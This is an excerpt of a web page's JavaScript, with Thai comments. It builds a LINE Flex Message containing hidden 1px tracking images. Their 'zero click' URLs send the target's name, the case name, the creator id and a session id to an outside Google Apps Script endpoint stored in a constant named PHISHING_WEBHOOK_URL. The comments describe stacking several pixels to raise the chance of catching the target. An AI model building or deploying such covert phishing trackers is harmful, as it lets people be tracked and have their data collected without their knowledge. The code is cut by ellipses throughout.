...
<body>
    ...
    <script>
        ...
        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbybjD4kNvb0YWlM3GAgWgPk_upAgozPT5nC1NsCz_8XaNKQidTieVT1u_cD93Z2yiES/exec'; // Updated GoogleScript.html Web App URL
        ...
        async function shareImage() {
            ...
            try {
                ...
                // สร้างเวลาปัจจุบันเป็น timestamp เพื่อป้องกันการแคชและระบุเซสชัน
                const sessionTimestamp = Date.now();
                const sessionId = Math.random().toString(36).substring(2, 10);
                
                // สร้าง URL สำหรับ Zero Click tracking พร้อมข้อมูลการติดตาม
                // เปลี่ยนเป็นใช้รูปแบบ Image Proxy ที่มีประสิทธิภาพมากขึ้น
                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
                zeroClickTrackUrl += `&key=${trackingKey}`;
                zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
                zeroClickTrackUrl += `&sid=${sessionId}`; // Session ID เฉพาะสำหรับการแชร์นี้
                zeroClickTrackUrl += `&ts=${sessionTimestamp}`; // Timestamp เพื่อป้องกันการแคช
                
                console.log("Zero Click Track URL:", zeroClickTrackUrl);

                // สร้าง Flex Message ที่มีประสิทธิภาพมากขึ้นในการติดตาม Zero Click
                const message = {
                    type: 'flex',
                    ...
                    contents: {
                        ...
                        body: {
                            ...
                            layout: 'vertical',
                            contents: [
                                // เทคนิค Multiple Tracking Pixels - ใช้หลาย URL ติดตาม
                                // ช่วยให้มีโอกาสมากขึ้นในการติดตามและได้ข้อมูลเป้าหมาย
                                {
                                    type: 'image',
                                ...
                                // เพิ่ม tracking image แบบมี margin เพื่อเพิ่มโอกาสในการโหลด
                                {
                                    type: 'image',
                                    url: `${zeroClickTrackUrl}&px=2`,
                                    size: '1px',
                                    aspectRatio: '1:1',
                                    aspectMode: 'cover',
                                    margin: 'sm'
                                },
                                // ใช้ Box ว่างมาแทรก tracking image เพื่อความเข้ากันได้
                                {
                                    type: 'box',
                                    layout: 'vertical',
                                    contents: [
                                ...
                                // เพิ่ม spacer เพื่อให้เนื้อหาใน body มีขนาดมากขึ้น
                                {
                                    type: 'spacer',
                                    size: 'xs'
                                }
                            ...
                            paddingAll: '0px',
                            backgroundColor: "#FFFFFF00" // โปร่งใส
                        },
                        // เพิ่ม footer ที่มี tracking image อีกตัว
                        footer: {
                            type: 'box',
                            layout: 'vertical',
                            contents: [
